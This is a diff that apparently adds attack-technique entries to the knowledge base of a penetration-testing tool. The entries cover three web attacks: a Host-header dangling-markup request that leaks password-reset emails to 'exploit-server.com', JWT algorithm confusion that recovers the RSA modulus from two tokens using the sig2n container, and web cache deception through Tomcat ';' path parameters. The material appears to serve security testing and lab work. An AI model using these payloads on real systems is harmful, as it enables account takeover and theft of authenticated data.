@@ -961,6 +961,21 @@ Use the \`race_single_packet\` tool for HTTP/2 multiplexed concurrent requests. 
 - **Token collision:** Timestamp-derived tokens collide when two resets fire in the same packet.
 
 For sub-millisecond synchronization requirements, use \`race_last_byte_sync\` which withholds the last byte of each request body and releases them simultaneously.
+
+## Host Header Dangling Markup — Password Reset Capture
+When the application reflects the Host header in password reset emails and uses an HTML email format, inject a dangling markup payload in the Host header to exfiltrate the password:
+\`\`\`
+POST /forgot-password
+Host: target.com:'<a href="https://exploit-server.com/exploit?
+Content-Type: application/x-www-form-urlencoded
+
+username=victim
+\`\`\`
+The injected \`<a>\` tag is left unclosed — the browser's HTML parser extends the href attribute value across subsequent email content (including the plaintext password) until it hits the next quote character. When the victim views the email, clicking any link or the email client preloading images sends the captured content to the attacker's server.
+Key requirements:
+- Application must reflect Host header in emails (no strict host validation)
+- Email must be HTML format (dangling markup does not work in plaintext)
+- The unclosed \`<a>\` tag consumes all subsequent content until the next matching quote
 `
       }]
     })
@@ -1021,6 +1036,21 @@ Set \`kid\` to a path traversal pointing to \`/dev/null\` (empty file), then sig
 }
 \`\`\`
 Sign the token with an empty string (\`""\`) as the secret key.
+
+## Algorithm Confusion Without Exposed Key (RSA Key Derivation)
+When the server uses RS256 but does NOT expose its public key via \`/.well-known/jwks.json\` or \`/certs\`:
+1. Obtain two different valid JWTs from the server (e.g., login twice or use different endpoints).
+2. Both tokens are signed with the same RSA private key. Extract the signature (\`s\`) and message hash (\`m\`) from each.
+3. Compute \`s^e - m\` for each token (using \`e = 65537\`). The result is a multiple of \`n\` (the RSA modulus).
+4. Compute \`GCD(s1^e - m1, s2^e - m2)\` to recover \`n\`.
+5. Reconstruct the public key as PEM from \`(n, e)\`.
+6. Use the recovered public key as the HS256 HMAC secret (algorithm confusion attack).
+\`\`\`bash
+# Use rsa_sign2n or jwt_forgery tools:
+docker run --rm -it portswigger/sig2n <jwt1> <jwt2>
+# Outputs candidate PEM keys; try each with HS256 signing
+\`\`\`
+This works because RSA signatures satisfy \`s^e ≡ m (mod n)\`, so \`s^e - m\` is always divisible by \`n\`. Two such values share \`n\` as a common factor.
 `
       }]
     })
@@ -2070,6 +2100,21 @@ The cache normalizes \`..%2f\` while the origin does not, combined with \`%23\` 
 1. The **origin** treats \`%23\` as \`#\` (fragment/delimiter), serves \`/my-account\`.
 2. The **cache** normalizes the full path: decodes \`%2f\` and resolves \`../\` → maps to \`/static/exploit.js\` cache key.
 3. Attacker requests \`/static/exploit.js\` and gets the cached authenticated page.
+
+## Exact-Match Cache Rule Bypass (Tomcat \`;\` Path Parameter)
+When the cache uses exact-match rules (e.g., only \`/js/tracking.js\` is cached, not wildcard \`.js\`), combine Tomcat's \`;\` path parameter with \`..%2f\` normalization discrepancy:
+\`\`\`
+/js/tracking.js;%0a..%2f..%2fmy-account
+\`\`\`
+1. The **cache** sees an exact match for \`/js/tracking.js\` (ignores everything after \`;\` or normalizes the path to match the rule) and caches the response.
+2. The **origin** (Tomcat) treats \`;\` as a path parameter delimiter, then normalizes \`..%2f\` — resolves to \`/my-account\` and serves the authenticated page.
+3. The attacker requests the same URL and receives the cached authenticated response.
+
+Key differences from wildcard attacks:
+- Exact-match rules require targeting a specific cached resource URL (e.g., \`/js/tracking.js\`).
+- The \`;\` parameter must be placed after the exact-match filename.
+- \`%0a\` (newline) or other characters may be needed to break the cache's parameter parsing.
+- Tomcat specifically treats \`;\` as a path parameter separator; other servers (Jetty, WildFly) may also support this.
 `
       }]
     })
